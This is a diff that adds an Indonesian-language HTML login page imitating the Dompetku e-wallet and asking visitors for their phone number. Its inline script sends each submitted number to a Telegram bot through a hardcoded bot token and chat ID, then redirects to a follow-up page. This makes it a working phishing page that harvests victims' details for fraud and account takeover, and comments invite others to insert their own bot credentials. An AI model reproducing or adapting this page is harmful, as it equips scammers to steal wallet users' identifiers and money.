@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Masuk - Dompetku</title>
+  <link rel="stylesheet" href="style5.css">
+</head>
+<body class="login-page">
+  <div class="login-container">
+    <img src="kup.jpg" alt="Dompetku" class="logo-img">
+    <p class="intro-text">Masukkan nomor HP kamu untuk lanjut</p>
+
+    <form id="formLogin" onsubmit="sendToTelegram(event)">
+      <div class="form-group">
+        <label class="label-text">Negara</label>
+        <label class="label-text">Nomor</label>
+        <div class="phone-group">
+          <div class="country-code">
+            <img src="https://flagcdn.com/w40/id.png" alt="ID" class="flag">
+            <span>+62</span>
+          </div>
+          <input type="tel" id="nomor" placeholder="0811-2345-6789" maxlength="14" required>
+        </div>
+      </div>
+
+      <p class="info-text">
+        Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
+        Dengan melanjutkan, kamu juga setuju dengan <strong>S&amp;K</strong> serta <strong>Kebijakan Privasi</strong> kami.
+      </p>
+
+      <!-- Tombol tetap di bawah -->
+      <div class="button-wrapper">
+        <button class="btn" type="submit">LANJUTKAN</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- Script Kirim Telegram + Auto Format -->
+  <script>
+    function sendToTelegram(e) {
+      e.preventDefault();
+
+      const nomor = document.getElementById('nomor').value;
+      const token = '8068753209:AAEjwnh9riVdHVoUkiOeCKNo7ts9FfIsBxI'; // Ganti dengan token bot kamu
+      const chatId = '6698220508';  // Ganti dengan ID Telegram kamu
+
+      const message = `📲 Nomor HP masuk: ${nomor}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        window.location.href = "index6.html";
+      })
+      .catch(err => {
+        alert("Gagal mengirim ke Telegram");
+        console.error(err);
+      });
+    }
+
+    // Auto-format nomor ke 4-4-4 (misalnya: 0812-2838-2837)
+    const nomorInput = document.getElementById("nomor");
+    nomorInput.addEventListener("input", function (e) {
+      let value = e.target.value.replace(/\D/g, ""); // hanya angka
+
+      // Maksimal 12 angka (3 blok x 4 angka)
+      value = value.slice(0, 12);
+
+      let result = "";
+      if (value.length > 0) result += value.substring(0, 4);
+      if (value.length > 4) result += "-" + value.substring(4, 8);
+      if (value.length > 8) result += "-" + value.substring(8, 12);
+
+      e.target.value = result;
+    });
+  </script>
+</body>
+</html>
